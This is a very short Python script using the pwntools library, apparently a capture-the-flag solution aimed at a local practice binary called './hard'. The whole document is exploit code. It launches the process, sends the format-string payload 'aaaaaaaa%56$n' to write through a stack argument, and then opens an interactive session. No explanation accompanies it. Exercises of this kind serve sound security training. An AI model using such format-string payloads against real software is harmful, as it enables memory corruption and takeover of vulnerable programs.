from pwn import*
p = process('./hard')

pay = ''
pay += 'aaaaaaaa%56$n'
p.send(pay)

p.interactive()


